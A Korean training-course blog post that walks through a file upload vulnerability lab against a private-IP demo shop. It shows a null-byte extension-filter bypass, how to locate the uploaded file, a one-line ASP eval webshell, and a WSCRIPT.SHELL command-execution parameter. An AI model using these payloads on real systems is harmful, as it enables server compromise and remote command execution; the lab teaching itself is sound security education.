@@ -1,0 +1,121 @@
+---
+layout: post
+title: File Upload
+subtitle: File Upload & Download
+categories: Web
+tags: [Web, File, WebShell, Pentest]
+---
+
+**본 내용 및 실습 환경은 KISEC, 케이쉴드 주니어 교육 과정에 있음을 알려드립니다.**
+
+## 파일 업로드 취약점
+
+<p align="center">
+<img src ="https://user-images.githubusercontent.com/78135526/179345672-fd75b54b-6a64-44b2-835d-08fe72ede21d.png">
+</p>
+
+주로 게시판 등에서 파일 업로드 기능을 악용하여 시스템 권한을 획득할 수 있는 취약점을 의미한다.
+
+공격자는 서버 사이드 스크립트(PHP, JSP, .NET 등)을 이용하여 웹쉘(WebShell)을 제작한다.
+
+확장자에 대한 검증 없이 파일 업로드 기능을 제공할 때 해당 취약점이 발생하게 된다.
+
+> 악성 스크립트가 업로드 된 후, 서버상에서 스크립트를 실행하여 쉘을 획득하는 등의 행위로 서버를 장악할 수 있다.
+
+해당 웹 쉘의 해당 확장자는 다음과 같다.
+
+언어  | 파일 확장자 |
+:-----: | :----------:|
+**PHP**       | **hp, php3, php4, php5, phtml, inc**    | 
+**JSP** | **jsp, jsf**   | 
+**ASP** | **Asp, asa, cds, cer 등**  |
+**ASP.NET** | **aspx, asax, ascx, ashx, asmx, axd, config, cs, csproj, licx, rem, resources, resx, soap, vb, vbproj, vsdisco, webinfo 등**  |
+
+## 실습. 파일 업로드 취약점
+
+우선, 해당 웹 서버가 어떠한 언어를 기반으로 작동하는지 알아야 한다.
+
+<p align="center">
+<img src ="https://user-images.githubusercontent.com/78135526/179345987-6195d56f-fe02-47c6-890f-e04a2e9d29d4.png" width = 380>
+</p>
+
+* 웹의 MAIN을 접근했을 때 MAIN을 구성하고 있는 웹의 확장자가 **ASP**인 것을 확인했다. 
+
+게시판에 접속하여 **ASP**확장자를 가진 웹 쉘을 업로드 해본다.
+
+<p align="center">
+<img src ="https://user-images.githubusercontent.com/78135526/179346080-60038f8a-93b7-42cf-8069-2b674a2536c5.png" width = 380>
+</p>
+
+* 하지만 확장자 필터링으로 인해 업로드가 되지 않았다. 
+
+### 확장자 필터링 우회
+
+확장자 필터링으로 파일 업로드에 실패했다. 우회 기법으로 **Null을 이용한 파일 업로드**를 진행할 것이다.
+
+Null을 파일명에 삽입하게 되면 웹에서는 Null 이후로는 없는 글자로 판단하기 때문에 이 처럼 응용이 가능하다.
+
+```
+webshell.asp >> webshell.asp%00.jpg 
+```
+
+시스템에서는 최종 확장자가 **.jpg** 이미지 파일로 확인하고, 웹에서는 **%00** 기준으로 없는 문자로 판별하기 때문에 최종적으로는 **asp** 확장자로 업로드가 되는 취약점이다.
+
+### 웹 쉘 경로 찾기
+
+이제 게시판에 잘 올라가 있는지 확인해본다.
+
+잘 올라 갔다면 Burpsuite를 키고, 파일을 다운로드 할 때 어느 경로에서 어떤 파일명을 다운로드하는지 확인해본다.
+
+<p align="center">
+<img src ="https://user-images.githubusercontent.com/78135526/179348613-f8969d67-a18f-4369-9900-93ed0f7a97cd.png">
+</p>
+
+파일명은 **webshell.asp**, 경로는 **upload_file**인 것을 알 수 있다.
+
+현재의 경로는 **/demoshop/shop_board/upload_file**인 것을 알 수 있다. 따라서 URL을 아래와 같이 이동해볼 것이다.
+
+> 현재 다운로드하면서 실행된 파일이 `shop_download.asp`인데 해당 경로가 `/shop_board`이고, f_path가 `upload_file`인 것은 상대경로로 현재의 위치(`/demoshop/shop_board`)라는 것이다.
+
+### 웹 쉘 실습
+
+```
+http://10.200.165.9/demoshop/shop_board/webshell.asp
+```
+
+<p align="center">
+<img src ="https://user-images.githubusercontent.com/78135526/179348898-f75fc06e-99a3-4d18-a864-343ed0ec88a6.png">
+</p>
+
+* 웹 쉘이 적용이 된 것이다. 해당 명령어를 입력하면 서버측에서의 명령이 전달되어 모든 내역을 확인 할 수 있다.
+
+<p align="center">
+<img src ="https://user-images.githubusercontent.com/78135526/179349133-c94e4c0f-dc80-41f2-9e9b-8f319dd10058.png">
+</p>
+
+### 한 줄 웹 쉘
+
+웹 쉘에 많은 기능을 넣기 위해 코드를 여러 작성하다 보면 용량이 커질 것이다. 그런 것을 대비하기 위해 게시판 파일 업로드 용량 제한이 생겼다.
+
+또한, 해당 사이트에서 용량 제한이 없다고 해도 네트워크 상에서 큰 용량에 대한 차단 기능으로 업로드 실패 할 수도 있다.
+
+그래서 등장한 것이 한 줄 웹 쉘(**일구화목마**라 불림)을 사용해볼 것이다.
+
+ASP의 한줄 웹쉘 코드는 `<% eval request("cmd") %>` 이것이다.
+
+위 코드를 ASP 확장자 필터링 우회해서 파일로 만들고, 업로드해서 위 방법처럼 접속하면 된다.
+
+이렇게 하면 GET 방식으로 명령어를 전달하게 되므로, 피해자가 패킷 검사를 하게 되면 알아 차리기 쉽게 된다.
+
+```
+?cmd=response.write(Server.CreateObject("WSCRIPT.SHELL").exec("cmd.exe > /c [command]").stdout.readall)
+```
+
+위 명령어를 한 줄 웹 쉘 위치까지 URL로 접속하고 파라미터로 전달하면 된다.
+
+<p align="center">
+<img src ="https://user-images.githubusercontent.com/78135526/179349607-a234b976-f8e4-41e7-813b-72b067864e72.png
+">
+</p>
+
+* 이렇게 파라미터로 전달된 명령 또한 출력이 되는 것을 알 수 있다.
